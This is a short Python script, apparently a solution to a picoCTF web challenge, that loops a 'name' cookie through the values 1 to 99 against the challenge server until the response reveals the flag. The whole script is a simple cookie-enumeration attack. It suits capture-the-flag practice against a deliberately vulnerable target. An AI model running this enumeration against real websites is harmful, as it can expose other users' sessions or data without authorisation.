import requests

url = "http://mercury.picoctf.net:54219/check"

s = requests.Session()
s.get(url)

for i in range(1, 100):
	cookie = {'name': str(i)}
	req = s.get(url, cookies=cookie)
	if "picoCTF{" in req.text:
		print(req.text)
		break
	else:
		print('Scanning cookie: ' + str(i))